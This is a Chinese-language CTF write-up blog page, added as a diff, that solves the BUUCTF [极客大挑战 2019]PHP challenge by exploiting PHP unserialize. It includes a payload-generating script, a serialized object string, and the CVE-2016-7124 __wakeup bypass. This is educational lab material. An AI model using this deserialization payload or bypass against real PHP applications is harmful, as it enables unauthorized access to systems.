@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web前端 -php," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言同样是buu，同样是极客大挑战，这次遇到了一题有关于php反序列化漏洞，遇到新东西总是要开博客记录的嘛。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php的序列化与反序列化">
+<meta property="og:url" content="http://example.com/2021/11/01/php%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言同样是buu，同样是极客大挑战，这次遇到了一题有关于php反序列化漏洞，遇到新东西总是要开博客记录的嘛。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/11/01/FdIPnND9ig38HaE.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/01/wZpndhTWgOHKRlC.png">
+<meta property="article:published_time" content="2021-11-01T10:07:52.000Z">
+<meta property="article:modified_time" content="2021-11-01T13:10:58.046Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web前端 -php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/11/01/FdIPnND9ig38HaE.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/11/01/php的序列化与反序列化/"/>
+
+
+
+
+
+  <title>php的序列化与反序列化 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/php%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php的序列化与反序列化</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-11-01T18:07:52+08:00">
+                2021-11-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>同样是buu，同样是极客大挑战，这次遇到了一题有关于php反序列化漏洞，遇到新东西总是要开博客记录的嘛。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>进入网页，我们发现一只猫在网页中心，我们鼠标控制着一团毛线，诶还挺好玩的。咳咳，进入正题，我们抓住题目给我们的提示——备份网站。一般备份网站的备份文件是在<a href="http://www.zip中，当然我们也可以用dirsearch来进行扫描，发现www.zip的状态为200：">www.zip中，当然我们也可以用dirsearch来进行扫描，发现www.zip的状态为200：</a><br><img src="https://i.loli.net/2021/11/01/FdIPnND9ig38HaE.png"></p>
+<p>接着我们打开备份文件，发现一个flag.php文件，但是显然我们能直接阅读到的并不是真正的flag。那么我们来阅读index.php代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;class.php&#x27;;</span><br><span class="line">$select = $_GET[&#x27;select&#x27;];</span><br><span class="line">$res=unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们注意到了这一行，变量select以GET方式输入，并进行反序列化，而且包含了文件class.php，那么我们打开class.php一探究竟：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里代码创建了一个结构体Name，设置其中的username与password。那么我们发现，只要设置username=admin&amp;password=100，那么再次执行_destruct就可以回显flag了。</p>
+<p>但是这里有个问题，wakeup会导致username被赋值成guest，那么我们就需要改变序列化字符串中对象的个数来绕过，我们使用下面这个程序生成URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username = &#x27;admin&#x27;;</span><br><span class="line">    private $password = &#x27;100&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Name();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用URL编码保证不可打印字符复制时不会丢失（当然也可以不编码），编码与不编码的结果分别如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>将Name后的2改为3（大一点也行），再输入进select中获取flag：<br><img src="https://i.loli.net/2021/11/01/wZpndhTWgOHKRlC.png"></p>
+<p>解毕</p>
+<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>序列化是将变量或对象转换成字符串的过程，而反序列化是将字符串转化为变量或对象的过程。一般在php中常用的序列化与反序列化方式有：<br><code>serialize，unserialize；json_encode，json_decode</code><br>一般在ctf中前者的使用更多。下面这篇博客中详细剖析了PHP序列化与反序列化，想要详细学习可以参考，本篇博客不做详细的介绍。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/youyoui/p/8610068.html">深度剖析PHP序列化和反序列化</a></p>
+<h1 id="反序列化漏洞的利用（随时更新）"><a href="#反序列化漏洞的利用（随时更新）" class="headerlink" title="反序列化漏洞的利用（随时更新）"></a>反序列化漏洞的利用（随时更新）</h1><p>利用这个漏洞有两个条件：</p>
+<ul>
+<li>unserialize()函数的参数是可控的</li>
+<li>php中有可利用的类并且类中含有魔术函数</li>
+</ul>
+<p>然后再介绍一批魔术函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_construct()：创建对象时初始化</span><br><span class="line">_destruction()：结束时销毁对象</span><br><span class="line">_toString()：对象被当作字符串时使用</span><br><span class="line">_sleep()：序列化对象之前调用</span><br><span class="line">_wakeup()：反序列化之前调用</span><br><span class="line">_call()：调用对象不存在时使用</span><br><span class="line">_get()：调用私有属性时使用</span><br></pre></td></tr></table></figure>
+
+<p>由此我们可以看出，当传给反序列化函数的参数可控时，我们可以传入一个序列化字符串从而控制对象内部的变量甚至函数。那么我们来详细介绍几个常见的反序列化漏洞的应用。</p>
+<h2 id="CVE-2016-7124（-wakeup-绕过）"><a href="#CVE-2016-7124（-wakeup-绕过）" class="headerlink" title="CVE-2016-7124（_wakeup()绕过）"></a>CVE-2016-7124（_wakeup()绕过）</h2><p>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，也就是上面的例题中我们使用的绕过方法，这里不再赘述。</p>
+<h2 id="others-wait-to-update"><a href="#others-wait-to-update" class="headerlink" title="others wait to update"></a>others wait to update</h2><p>由于查阅了其他人写的博客发现这里面的水很深，因此在以后每碰到一种新的方式都会在这前面进行更新。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>刷buu发现还有很多的新知识等待掌握，刷题还是很有效果的。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web%E5%89%8D%E7%AB%AF-php/" rel="tag"># -web前端 -php</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/10/30/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="next" title="php文件包含漏洞利用">
+                <i class="fa fa-chevron-left"></i> php文件包含漏洞利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="nav-number"></span> <span class="nav-text">[极客大挑战 2019]PHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number"></span> <span class="nav-text">序列化与反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%EF%BC%88%E9%9A%8F%E6%97%B6%E6%9B%B4%E6%96%B0%EF%BC%89"><span class="nav-number"></span> <span class="nav-text">反序列化漏洞的利用（随时更新）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-7124%EF%BC%88-wakeup-%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">CVE-2016-7124（_wakeup()绕过）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#others-wait-to-update"><span class="nav-number">2.</span> <span class="nav-text">others wait to update</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
